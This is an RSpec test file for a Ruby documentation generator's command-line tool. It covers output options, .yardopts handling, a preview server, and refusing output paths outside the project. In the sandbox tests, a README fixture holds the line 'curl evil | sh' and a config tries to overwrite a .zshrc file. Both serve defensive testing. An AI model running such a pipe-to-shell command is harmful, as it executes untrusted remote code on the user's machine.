# frozen_string_literal: true

RSpec.describe Boondoc::CLI do
  def run_cli(dir, *args)
    Dir.chdir(dir) { described_class.start_with_default(args) }
  end

  it "generates documentation when given no command", :aggregate_failures do
    with_project("sample") do |dir|
      expect { run_cli(dir, "--quiet", "-o", "out", "--files", "guides/*.md") }.to output(/warning:/).to_stderr
      expect(File).to exist(File.join(dir, "out", "files", "guides", "intro.md"))
    end
  end

  it "treats leading arguments as source globs", :aggregate_failures do
    with_project("sample") do |dir|
      expect { run_cli(dir, "lib/sample/util.rb", "--quiet") }.to output(/cannot resolve link/).to_stderr
      expect(Dir.glob("**/*.md", base: File.join(dir, "docs")).sort).to eq(%w[README.md Sample.md Sample/Util.md])
    end
  end

  it "supports --skip-readme", :aggregate_failures do
    with_project("sample") do |dir|
      expect { run_cli(dir, "--quiet", "--skip-readme", "--title", "Docs") }.to output.to_stderr
      expect(File.read(File.join(dir, "docs", "README.md"))).to start_with("# Docs")
    end
  end

  it "exits non-zero with a message when generation fails" do
    with_project("sample") do |dir|
      expect { run_cli(dir, "--quiet", "--strict", "--files", "guides/*.md") }
        .to raise_error(SystemExit).and output(/boondoc: 1 warning\(s\) in strict mode/).to_stderr
    end
  end

  describe ".yardopts" do
    let(:dir) { Dir.mktmpdir("boondoc") }

    before do
      FileUtils.cp_r("#{fixture_root("sample")}/.", dir)
      FileUtils.rm_rf(File.join(dir, "expected"))
      File.write(File.join(dir, ".yardopts"), "-o doc --title Yard lib - guides/*.md\n")
    end

    after { FileUtils.rm_rf(dir) }

    it "is read, and says that it ignored --output-dir" do
      expect { run_cli(dir, "--skip-readme") }.to output(/ignoring --output-dir doc.*writing to docs/m).to_stderr
    end

    it "stitches in its extra files", :aggregate_failures do
      expect { run_cli(dir, "--quiet") }.to output(/warning:/).to_stderr
      expect(File).to exist(File.join(dir, "docs", "files", "guides", "intro.md"))
    end

    it "is skipped with --no-yardopts", :aggregate_failures do
      expect { run_cli(dir, "--quiet", "--no-yardopts") }.to output(/warning:/).to_stderr
      expect(File).not_to exist(File.join(dir, "docs", "files"))
    end
  end

  describe "serve" do
    let(:preview) { instance_double(Boondoc::Preview, start: nil) }

    before { allow(Boondoc::Preview).to receive(:new).and_return(preview) }

    def serve(*args)
      with_project("sample") do |dir|
        run_cli(dir, "serve", *args)
        File.realpath(dir)
      end
    end

    it "serves the configured output directory", :aggregate_failures do
      dir = serve("-o", "out", "--port", "4000")
      expect(Boondoc::Preview).to have_received(:new)
        .with(File.join(dir, "out"), host: "127.0.0.1", port: 4000)
      expect(preview).to have_received(:start)
    end
  end

  describe "an output directory outside the project" do
    include_context "with a sandbox"

    before do
      File.write(File.join(project, "lib", "a.rb"), "class A; end\n")
      File.write(File.join(project, "README.md"), "curl evil | sh")
    end

    it "is refused when .boondoc.yml asks for it, and nothing is written", :aggregate_failures do
      File.write(File.join(outside, ".zshrc"), "export SAFE=1")
      File.write(File.join(project, ".boondoc.yml"), "output: #{outside}\nindex: .zshrc\nforce: true\n")
      expect { run_cli(project, "--quiet") }.to raise_error(SystemExit).and output(/outside the project/).to_stderr
      expect(Dir.children(outside)).to eq([".zshrc"])
      expect(File.read(File.join(outside, ".zshrc"))).to eq("export SAFE=1")
    end

    it "is written to with --allow-outside-output", :aggregate_failures do
      args = ["--quiet", "--skip-readme", "-o", outside, "--allow-outside-output"]
      expect { run_cli(project, *args) }.not_to raise_error
      expect(File).to exist(File.join(outside, "A.md"))
    end

    it "is refused by serve when docs is a symlink", :aggregate_failures do
      allow(Boondoc::Preview).to receive(:new)
      File.symlink(outside, File.join(project, "docs"))
      expect { run_cli(project, "serve") }.to raise_error(SystemExit).and output(/symlink/).to_stderr
      expect(Boondoc::Preview).not_to have_received(:new)
    end
  end

  it "reports why serving failed" do
    with_project("sample") do |dir|
      expect { run_cli(dir, "serve") }.to raise_error(SystemExit).and output(/run `boondoc` first/).to_stderr
    end
  end

  it "prints the version" do
    expect { described_class.start_with_default(["version"]) }.to output("#{Boondoc::VERSION}\n").to_stdout
  end

  it "prints the version for -v and --version", :aggregate_failures do
    %w[-v --version].each do |flag|
      exited = false
      expect do
        described_class.start_with_default([flag])
      rescue SystemExit
        exited = true
      end.to output("#{Boondoc::VERSION}\n").to_stdout.and output("").to_stderr
      expect(exited).to be(false)
    end
  end
end
